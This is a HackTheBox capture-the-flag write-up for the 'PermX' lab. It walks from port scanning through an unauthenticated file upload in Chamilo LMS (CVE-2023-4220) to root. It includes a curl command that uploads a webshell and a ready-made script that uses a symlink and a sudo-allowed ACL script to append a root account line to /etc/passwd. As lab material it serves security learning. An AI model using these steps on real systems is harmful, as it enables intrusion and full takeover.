--------------------

### CTF: HACKTHEBOX
### LAB: PERMX

--------------------

![image](https://github.com/user-attachments/assets/75d9e644-9cab-4a9c-9ad7-835f15977ac6)

--------------------

### RECONNAISSANCE

- Rustscan's output

       ❯ rustscan -a 10.10.11.23 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Nmap? More like slowmap.🐢
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.11.23:22
      Open 10.10.11.23:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 10:18 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      Initiating Ping Scan at 10:18
      Scanning 10.10.11.23 [2 ports]
      Completed Ping Scan at 10:18, 0.21s elapsed (1 total hosts)
      Initiating Connect Scan at 10:18
      Scanning permx.htb (10.10.11.23) [2 ports]
      Discovered open port 80/tcp on 10.10.11.23
      Discovered open port 22/tcp on 10.10.11.23
      Completed Connect Scan at 10:18, 0.21s elapsed (2 total ports)
      Initiating Service scan at 10:18
      Scanning 2 services on permx.htb (10.10.11.23)
      Completed Service scan at 10:18, 6.81s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.11.23.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 7.61s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 3.17s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      Nmap scan report for permx.htb (10.10.11.23)
      Host is up, received conn-refused (0.21s latency).
      Scanned at 2024-09-03 10:18:10 EDT for 18s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
      |   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
      80/tcp open  http    syn-ack Apache httpd 2.4.52
      |_http-server-header: Apache/2.4.52 (Ubuntu)
      | http-methods: 
      |_  Supported Methods: POST OPTIONS HEAD GET
      |_http-title: eLEARNING
      Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
      
      NSE: Script Post-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 10:18
      Completed NSE at 10:18, 0.00s elapsed
      Read data files from: /usr/bin/../share/nmap
      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
      Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds

- Subdomain enumeration with ffuf spots `lms`,we don't need to check `www` it is just the normal `permx.htb` page

![image](https://github.com/user-attachments/assets/d0aa315e-6154-4454-902b-a92b7a6d86f5)

- Subdomain `lms.permx.htb` hosts a learning management portal `Chamilo`

![image](https://github.com/user-attachments/assets/41ce957a-202a-4200-861b-8ae530530ff5)

- Chamilo is vulnerable to unauthenticated file upload as explained in this [github repo](https://github.com/dollarboysushil/Chamilo-LMS-Unauthenticated-File-Upload-CVE-2023-4220)

--------------------------

### Exploiting Chamilo with curl

- Php page `/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported` allows us to upload any file type, we can upload a webshell
to execute commands

- I uploaded the file with curl

      ❯ curl -F "bigUploadFile=@<shell filename>" "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
      The file has successfully been uploaded.%

- Access your web shell at route `/main/inc/lib/javascript/bigupload/files/[filename]`

![image](https://github.com/user-attachments/assets/96ad56c7-1103-4f1d-8139-609a243ac5e8)

- Shell access

![image](https://github.com/user-attachments/assets/6ce94f61-5a54-44cb-880b-7555fe3c87ee)
 
### USER MTZ

- I ran linpeas and discovered a password in a db config file. I was able to login to user `mtz` with the password

![image](https://github.com/user-attachments/assets/87932ed3-46d3-4532-88c6-c5d46198159c)

- User `mtz` access

![image](https://github.com/user-attachments/assets/ad7c7cca-a266-4708-8aa3-089ef80f3711)

---------------------

### PRIVESC with SETFACL

- I ran `sudo -l` and noticed a rule that user `mtz` can run a sh script `/opt/acl.sh` as root without passwd

![image](https://github.com/user-attachments/assets/7f748f6b-1d7e-439f-8d01-d334b46c64a2)

### Acl.sh

- The script's usage syntax is `acl.sh [user] [perm] [file]`
- The target file must be in `/home/mtz/*` file directory and must not contain `..` to prevent path traversal.

      if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
        /usr/bin/echo "Access denied."
        exit 1
- Then,this code checks if it is a file

        # Check if the path is a file
      if [ ! -f "$target" ]; then
          /usr/bin/echo "Target must be a file."
          exit 1
      fi
- Then, it runs `setfacl` to grant a user specific permissions in respect to a file.

      /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

----------------------

### Exploiting the ACL script

- We can exploit this by creating symbolic link of `/etc/passwd` in mtz's directory.After creating the symbolic link wiith write access to `/etc/passwd`,
we can edit and add a new user hash with root privileges.

![image](https://github.com/user-attachments/assets/57074117-d2e1-42fb-a2a7-8ee866fc06fd)

- We will copy this root hash to password to the passwd symbolic link,you can generate an hash with `openssl passwd [password]`.
This hash's password is `password123`.

      sensei:$1$1YY732V9$Irh.HtaGlscLmIz6SLQgM/:0:0:root:/root:/bin/bash

- Editing the passwd file

![image](https://github.com/user-attachments/assets/8e726103-03c1-490d-b623-d96d97c567dc)

- It reflects in `/etc/passwd`

![image](https://github.com/user-attachments/assets/93062d63-b64a-420f-9097-b24c94ce3bbb)

- You can automate it with this

       ln -s /etc/passwd ~/passwd
       sudo -u root /opt/acl.sh mtz rwx /home/mtz/passwd
       echo "sensei:\$1\$1YY732V9\$Irh.HtaGlscLmIz6SLQgM/:0:0:root:/root:/bin/bash" >> /home/mtz/passwd
       /usr/bin/echo "enter 'password123'"
       su sensei


- Access to user `sensei`

![image](https://github.com/user-attachments/assets/d1769749-3965-4804-a021-3b0962f6ed38)

- Root

![image](https://github.com/user-attachments/assets/4150d4c0-7d05-4ee1-a0da-9153e2b2866a)

-----------------------

### THANKS FOR READING!!!!

------------------------

### REFERENCES:

- [Chamilo](https://github.com/dollarboysushil/Chamilo-LMS-Unauthenticated-File-Upload-CVE-2023-4220)
- [My Exploit for Chamilo](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/HTB/scripts/ChamiloCVE.py)

-------------------------


  



